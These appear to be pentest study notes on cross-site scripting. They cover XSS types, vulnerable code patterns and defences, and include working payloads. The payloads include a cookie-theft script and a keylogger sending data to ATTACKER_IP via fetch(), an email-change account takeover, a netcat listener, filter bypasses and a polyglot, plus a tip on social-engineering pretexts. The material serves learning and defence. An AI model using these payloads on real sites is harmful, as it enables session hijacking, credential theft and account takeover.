# Cross-Site Scripting (XSS)

**Category:** Web Vulnerabilities  
**OWASP:** A03 Injection  
**Impact:** Script execution in victim's browser — session hijacking, credential theft, keylogging, account takeover

---

## What Is XSS

XSS occurs when a web application accepts user input and renders it back to the browser without proper sanitization, allowing an attacker's JavaScript to execute in the victim's browser. The injected script runs with the same privileges as legitimate code on that page — same origin, same access to cookies, DOM, and session data.

---

## Key Concepts

**DOM (Document Object Model):** The browser's live, in-memory tree representation of a web page. JavaScript can read and modify any node in real time. XSS attacks manipulate the DOM by injecting malicious scripts that the browser executes as if they were part of the legitimate page.

**Cookies:** Small pieces of data stored in the browser (session IDs, preferences). If readable by JavaScript and XSS is possible, an attacker can steal cookies and hijack sessions. `HttpOnly` flag prevents JavaScript from reading the cookie — good defense.

**Escaping/Output encoding:** Transforming user data so the browser treats it as text not code. `<` becomes `&lt;` so `<script>` becomes harmless text visible on screen rather than executable code.

**URL parameters:** Data passed after `?` in a URL (`?q=hello`). User-controllable and untrusted — common injection point.

---

## XSS Payload Structure

Every XSS payload has two parts:

**Intention** — what the payload does:
- Proof of concept (alert box)
- Session cookie theft
- Keylogging
- Business logic abuse
- Phishing/content injection

**Modification** — adjusting the payload to execute in the specific context where input is reflected (HTML, attribute, JavaScript block, etc.)

---

## Types of XSS

### Reflected XSS

User input is immediately reflected back in the server's response without being stored. Attacker crafts a malicious URL and tricks the victim into clicking it.

**Flow:**
```
Attacker crafts malicious URL
→ Victim clicks link
→ Browser sends request with payload in URL parameter
→ Server reflects payload in response
→ Browser executes injected JavaScript
```

**Example:** Search field reflects query in response
```
https://target.com/search?q=<script>alert('XSS')</script>
```

**Root cause:** Server reads URL parameter and renders it directly into HTML without escaping.

**Impact:** Affects only users who click the malicious link. Requires social engineering to deliver.

---

### Stored XSS (Persistent)

Attacker input is saved to the server (database) and rendered to every user who views that content. More dangerous than reflected because the payload persists and affects multiple victims automatically.

**Flow:**
```
Attacker submits malicious input (comment, profile, ticket)
→ Server stores payload in database
→ Any user viewing that content loads the page
→ Browser executes the stored JavaScript
→ Every visitor is affected
```

**Common locations:**
- Comment sections
- User profile bios
- Support tickets
- Product reviews
- Message boards
- File upload metadata

**Root cause:** Application stores raw user input and renders it using `{{ input|safe }}` or equivalent — bypassing automatic escaping.

**Impact:** Persistent, affects all visitors including admins. One payload can compromise many accounts.

---

### DOM-Based XSS

The attack happens entirely client-side. JavaScript reads attacker-controlled data from the DOM (URL, hash, referrer, localStorage) and writes it back to the page unsafely. The payload never reaches the server — server-side defenses don't help.

**Common sources (attacker-controlled input):**
- `location.href`
- `location.search`
- `location.hash`
- `document.referrer`
- `localStorage`
- `document.cookie`

**Common sinks (dangerous write operations):**
- `innerHTML`
- `document.write()`
- `eval()`
- `setTimeout(string)`

**Example:**
```javascript
// Vulnerable code
document.getElementById("preview").innerHTML = location.hash.substring(1);

// Attack URL
https://target.com/page#<img src=x onerror="alert('XSS')">
```

**Root cause:** Client-side JavaScript trusts untrusted input and uses a dangerous sink instead of treating the value as text.

**Does DOM XSS occur server-side? No** — it happens entirely in the browser.

---

### Blind XSS

Like stored XSS but the attacker cannot see or test the payload executing. The payload fires later in a different user's browser — typically an admin or staff member viewing logs, tickets, or moderation panels.

**Flow:**
```
Attacker submits payload in contact form, support ticket, feedback form
→ Payload stored on server
→ Admin views the submission in a private portal
→ JavaScript executes in admin's browser
→ Attacker receives callback with admin's cookies/session
```

**Testing approach:** Payload must include a callback — an HTTP request to the attacker's server — so you know when it fires.

**Tool:** XSS Hunter Express — automatically captures cookies, URLs, page contents when payload fires.

---

## XSS Payload Examples

### Proof of Concept
```javascript
<script>alert('XSS')</script>
```

### Session Cookie Theft
```javascript
<script>fetch('https://ATTACKER_IP:PORT?cookie=' + btoa(document.cookie));</script>
```
`btoa()` base64 encodes the cookie for safe URL transmission.

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://ATTACKER_IP/log?key=' + btoa(e.key));
}
</script>
```

### Business Logic Abuse
```javascript
<script>user.changeEmail('attacker@evil.com');</script>
```

### Cookie Exfiltration via Netcat
```bash
# Start listener
nc -nlvp 9001
```
```javascript
# Payload
</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>
```

---

## Payload Modification by Context

Where your input lands determines how the payload needs to be structured.

### HTML body context
```javascript
<script>alert('THM')</script>
```

### Inside an input tag attribute
```javascript
// Input: <input value="USER_INPUT">
// Payload closes value and tag, then injects script
"><script>alert('THM')</script>
```

### Inside a textarea tag
```javascript
// Input: <textarea>USER_INPUT</textarea>
// Payload closes textarea first
</textarea><script>alert('THM')</script>
```

### Inside a JavaScript string
```javascript
// Input: var name = 'USER_INPUT';
// Payload closes string, ends statement, injects, comments out rest
';alert('THM');//
```

### When angle brackets are filtered
```javascript
// Can't use < or > — use event handlers on existing tags
/images/cat.jpg" onload="alert('THM');
```

### When the word "script" is filtered
```javascript
// Filter removes "script" — nest it so removing it leaves "script"
<sscriptcript>alert('THM')</sscriptcript>
// After filter removes inner "script": <script>alert('THM')</script>
```

### Image onerror event (no script tag needed)
```javascript
<img src=x onerror="alert('XSS')">
```

---

## XSS Polyglot

A single string that works across multiple contexts by escaping attributes, tags, and filters simultaneously. Useful for quick testing across unknown contexts.

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

---

## Testing Methodology

**Step 1 — Find input points:**
- Search fields
- Comment forms
- Profile fields
- URL parameters
- Hidden form fields
- HTTP headers (User-Agent, Referrer)

**Step 2 — Probe the reflection:**
Enter a unique string and find where it appears in the page source. Determine the context (HTML body, attribute, JavaScript, etc.)

**Step 3 — Test with basic payload:**
```javascript
<script>alert('XSS')</script>
```

**Step 4 — If basic fails, identify the filter:**
- Is the word "script" being removed?
- Are `<` and `>` being encoded?
- Are quotes being escaped?
- Is there a CSP header blocking inline scripts?

**Step 5 — Adapt payload to context and filter:**
Use the payload modification techniques above based on where the input lands.

**Step 6 — Escalate:**
Replace `alert()` with a real payload — cookie theft, keylogger, or callback for blind XSS.

---

## Identifying Vulnerable Code Patterns

**Dangerous in templates (Jinja2/Flask):**
```python
{{ user_input|safe }}  # bypasses auto-escaping
```

**Dangerous in JavaScript:**
```javascript
element.innerHTML = userInput;      // dangerous sink
document.write(userInput);          // dangerous sink
eval(userInput);                    // dangerous sink
```

**Safe alternatives:**
```javascript
element.textContent = userInput;    // safe — renders as text
element.setAttribute('value', userInput);  // safe for attributes
```

---

## Defenses (Developer Perspective)

**Output encoding/escaping:** Encode all user-supplied data before rendering. `<` → `&lt;`, `"` → `&quot;`, etc. Context matters — HTML encoding differs from JavaScript encoding.

**Content Security Policy (CSP):** HTTP header that tells the browser which scripts are allowed to execute. Blocks inline scripts and restricts script sources.
```
Content-Security-Policy: script-src 'self' https://trusted.com
```

**HttpOnly cookie flag:** Prevents JavaScript from reading session cookies — limits XSS impact even when injection succeeds.
```
Set-Cookie: session=abc123; HttpOnly; Secure
```

**Input validation:** Allowlist acceptable input — reject or strip unexpected characters. Not sufficient alone — must be combined with output encoding.

**Use safe DOM APIs:** `textContent` instead of `innerHTML`, `setAttribute` instead of direct HTML construction.

---

## Impact Summary

| XSS Type | Persistence | Victims | Server Involved |
|---|---|---|---|
| Reflected | None — per request | Users who click malicious link | Yes |
| Stored | Permanent until removed | All visitors to affected page | Yes |
| DOM-based | Per request | Users who load malicious URL | No |
| Blind | Permanent | Admin/staff viewing submissions | Yes |

---

## Pentest Notes

- Always start with `alert()` as PoC — simple, unambiguous, proves execution
- `document.cookie` gives you session tokens — combine with `fetch()` to exfiltrate
- `btoa()` base64 encodes for safe URL transmission — decode at `base64decode.org`
- HttpOnly cookies won't appear in `document.cookie` — still test other impacts
- Reflected XSS requires social engineering — craft a believable pretext for the link
- Blind XSS requires a callback — use netcat, Burp Collaborator, or XSS Hunter
- Filter bypass: nested words, event handlers, encoding, polyglots
- DOM XSS: check client-side JS for dangerous sinks reading URL/hash/referrer
- CSP headers can block your payload — check response headers before giving up
